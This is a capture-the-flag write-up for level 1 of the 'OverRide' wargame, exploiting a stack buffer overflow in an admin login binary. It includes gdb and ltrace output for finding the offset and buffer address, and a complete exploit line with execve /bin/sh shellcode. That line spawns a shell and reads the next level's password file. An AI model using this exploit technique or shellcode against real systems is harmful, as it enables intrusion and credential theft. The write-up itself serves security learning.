# Level 1

Before us we have a binary which represents an admin login prompt.
First, it asks us for the username which it `fgets` into a global variable called `a_user_name`, and if it matches `dat_wil`, we can input a password that is then checked against "admin". This however is just a silly attempt at trolling from wil.
The password will then be read into a 64 byte buffer with `fgets`, but here fgets will read up to 256 bytes, so we can overflow.

Let's use our trusty [pattern generator](https://wiremask.eu/tools/buffer-overflow-pattern-generator/)
```shell
(gdb) r < <(echo 'dat_wil'; sleep .2; python -c 'print "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A"')
Starting program: /home/users/level01/level01 < <(echo 'dat_wil'; sleep .2; python -c 'print "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A"')
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password:
nope, incorrect password...


Program received signal SIGSEGV, Segmentation fault.
0x37634136 in ?? ()
```
We now know that we can override EIP 80 characters in.

Now that we know the offset of the overflow we'll need the address of the password buffer in memory. To accomplish this we can check the return value of the second `fgets` within `ltrace`. 
Note: Some form of address randomization is employed here, so the returned address is subject to changes.
```shell
level01@OverRide:~$ ltrace -e 'fgets' ./level01 < <(echo 'dat_wil'; sleep .2; echo 'deeznuts') 1>/dev/null
fgets("dat_wil\n", 256, 0xf7fcfac0)                                                                = 0x0804a040
fgets("deeznuts\n", 100, 0xf7fcfac0)                                                               = 0xffffd6cc
+++ exited (status 1) +++
```

Let's now inject the buffer address after our 28 bytes [shellcode](https://shell-storm.org/shellcode/files/shellcode-811.html) and 52 bytes of padding.
```shell
level01@OverRide:~$ (echo 'dat_wil'; python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "B"*52 + "\xcc\xd6\xff\xff"'; cat) | ./level01
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password:
nope, incorrect password...

whoami
level02
cat /home/users/level02/.pass
[censored]
```
Bingo!
